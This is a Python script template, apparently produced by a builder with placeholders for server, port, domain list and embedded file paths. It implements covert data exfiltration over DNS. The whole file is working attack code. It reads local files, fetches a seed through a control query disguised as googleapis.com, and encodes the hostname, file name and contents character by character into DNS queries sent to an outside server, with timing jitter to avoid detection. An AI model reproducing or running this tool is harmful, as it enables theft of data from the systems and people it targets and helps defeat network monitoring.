#!/usr/bin/env python3
import socket, struct, sys, os, time, random

SERVER = "{{SERVER_HOST}}"
PORT = {{SERVER_PORT}}
DELAY = {{DELAY}} / 1000.0
JITTER = {{JITTER}} / 1000.0
FILES = {{EMBEDDED_FILES}}

CTRL_DOMAIN = "googleapis.com"
DOMAINS = {{DOMAINS}}

_P = [chr(i) for i in range(32, 127)]
ALL_CHARS = _P + ["\n", "\t", "\r"]

QTYPE_A = 1
QTYPE_MX = 15
QTYPE_AAAA = 28

CTRL_START = 0
CTRL_END_HOST = 1
CTRL_END_FILE = 2
CTRL_END_DATA = 3
CTRL_CHUNK_OFF = 3


def _xr(s):
    s ^= (s << 13) & 0xFFFFFFFF
    s ^= (s >> 17)
    s ^= (s << 5) & 0xFFFFFFFF
    return s & 0xFFFFFFFF


def _perm(seed):
    p = list(range(len(ALL_CHARS)))
    st = seed & 0xFFFFFFFF
    if st == 0:
        st = 1
    for i in range(len(p) - 1, 0, -1):
        st = _xr(st)
        j = st % (i + 1)
        p[i], p[j] = p[j], p[i]
    return p


def _c2d(perm):
    return {ALL_CHARS[ci]: DOMAINS[perm[ci]] for ci in range(len(perm))}


def _enc_dom(d):
    o = b""
    for l in d.split("."):
        o += struct.pack("B", len(l)) + l.encode()
    return o + b"\x00"


def _query(txid, domain, qtype):
    h = struct.pack("!6H", txid, 0x0100, 1, 0, 0, 0)
    q = _enc_dom(domain) + struct.pack("!2H", qtype, 1)
    return h + q


def _parse_a(data):
    if len(data) < 12:
        return None
    if struct.unpack("!H", data[6:8])[0] < 1:
        return None
    off = 12
    while off < len(data) and data[off] != 0:
        off += 1 + data[off]
    off += 5
    if off + 2 > len(data):
        return None
    if (data[off] & 0xC0) == 0xC0:
        off += 2
    else:
        while off < len(data) and data[off] != 0:
            off += 1 + data[off]
        off += 1
    if off + 10 > len(data):
        return None
    rt = struct.unpack("!H", data[off:off + 2])[0]
    off += 8
    rl = struct.unpack("!H", data[off:off + 2])[0]
    off += 2
    if rt == 1 and rl == 4 and off + 4 <= len(data):
        return data[off:off + 4]
    return None


def _txid(cid, seq):
    return ((cid & 0xFF) << 8) | (seq & 0xFF)


def _send(sock, txid, domain, qtype):
    pkt = _query(txid, domain, qtype)
    sock.sendto(pkt, (SERVER, PORT))
    try:
        resp, _ = sock.recvfrom(4096)
        return resp
    except socket.timeout:
        return None


def _ctrl(sock, cid, seq):
    return _send(sock, _txid(cid, seq), CTRL_DOMAIN, QTYPE_A)


def _sleep():
    d = DELAY + random.uniform(-JITTER, JITTER)
    if d > 0:
        time.sleep(d)


def _send_phase(sock, cid, text, qtype, c2d):
    seq = 0
    chunk = 0
    for ch in text:
        dom = c2d.get(ch)
        if not dom:
            continue
        _send(sock, _txid(cid, seq), dom, qtype)
        seq += 1
        if seq > 255:
            chunk += 1
            _ctrl(sock, cid, CTRL_CHUNK_OFF + chunk)
            seq = 0
        _sleep()


def exfil(filepath):
    if not os.path.isfile(filepath):
        return

    with open(filepath, "r") as f:
        content = f.read()

    hostname = socket.gethostname()
    filename = os.path.basename(filepath)
    cid = random.randint(1, 255)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    seed = None
    for _ in range(3):
        resp = _ctrl(sock, cid, CTRL_START)
        if resp:
            ip = _parse_a(resp)
            if ip:
                seed = int.from_bytes(ip, "big")
                break
        time.sleep(0.5)

    if seed is None:
        sock.close()
        return

    c2d = _c2d(_perm(seed))
    _sleep()

    _send_phase(sock, cid, hostname, QTYPE_AAAA, c2d)
    _ctrl(sock, cid, CTRL_END_HOST)
    _sleep()

    _send_phase(sock, cid, filename, QTYPE_MX, c2d)
    _ctrl(sock, cid, CTRL_END_FILE)
    _sleep()

    _send_phase(sock, cid, content, QTYPE_A, c2d)
    _ctrl(sock, cid, CTRL_END_DATA)
    sock.close()


if __name__ == "__main__":
    targets = sys.argv[1:] or FILES
    for fp in targets:
        exfil(fp)
